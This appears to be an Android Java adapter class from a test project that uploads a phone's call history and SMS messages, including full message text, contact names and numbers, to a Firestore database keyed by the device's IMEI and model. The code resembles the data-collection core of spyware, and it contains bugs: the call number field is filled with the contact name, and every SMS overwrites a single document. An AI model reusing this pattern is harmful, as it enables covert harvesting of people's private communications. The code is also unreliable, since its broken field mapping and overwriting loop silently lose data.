package com.abhi_pandey.test.firebase;

import android.content.Context;
import android.os.Build;
import android.util.Log;
import android.widget.Toast;

import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.FirebaseApp;
import com.google.firebase.firestore.CollectionReference;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.Query;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class firebaseDatabaseAdapter {





    private String collectionName="Calllogs";

    String deviceModel= Build.MODEL;

    FirebaseFirestore db = FirebaseFirestore.getInstance();

    public void sendToDB(ArrayList<dbModelCall> listCallLogs,String IMEI) {
        Map<String, Object> callLog = new HashMap<>();
        CollectionReference collection = FirebaseFirestore.getInstance().collection("("+IMEI+")"+deviceModel);

        for (int i = 0; i < listCallLogs.size(); i++) {

            DocumentReference document = collection.document();
            callLog.put("id", listCallLogs.get(i).getId());
            callLog.put("callName", listCallLogs.get(i).getCallName());
            callLog.put("callNumber", listCallLogs.get(i).getCallName());
            callLog.put("callType", listCallLogs.get(i).getCallType());
            callLog.put("callStartTime", listCallLogs.get(i).getCallStartTime());
            callLog.put("callEndTime", listCallLogs.get(i).getCallEndTime());
            callLog.put("callDuration", listCallLogs.get(i).getCallDuration());
            callLog.put("callDate", listCallLogs.get(i).getCallDate());

            document.set(callLog).addOnSuccessListener(new OnSuccessListener<Void>() {
                public void onSuccess(Void documentReference) {
                    Log.i("sendCallLokkkkkkkkkkkk", "your call Log was added successfully"+ listCallLogs.size());

                }
            });
        }
    }

    private String collectionNam="Smslogs";

    public void sendToSmsDB(ArrayList<dbModelSMS> listSMSLogs,String IMEI) {
        Map<String, Object> smsLog = new HashMap<>();
        DocumentReference collection = db.collection("("+IMEI+")"+deviceModel).document(collectionNam);

        for (int i = 0; i < listSMSLogs.size(); i++) {
            smsLog.put("id", listSMSLogs.get(i).getId());
            smsLog.put("smsName", listSMSLogs.get(i).getSmsName());
            smsLog.put("smsNumber", listSMSLogs.get(i).getSmsAddress());
            smsLog.put("smsContent", listSMSLogs.get(i).getSmsContent());
            smsLog.put("smsType", listSMSLogs.get(i).getSmsType());
            smsLog.put("smsTime", listSMSLogs.get(i).getSmsTime());
            smsLog.put("smsDate", listSMSLogs.get(i).getSmsDatee());
            smsLog.put("threadId", listSMSLogs.get(i).getThreadId());

            collection.set(smsLog).addOnSuccessListener(new OnSuccessListener<Void>() {
                public void onSuccess(Void documentReference) {
                    Log.i("sendSMSogToDB", "your call Log was added successfully"+ listSMSLogs.size());

                }
            });
        }
    }

}
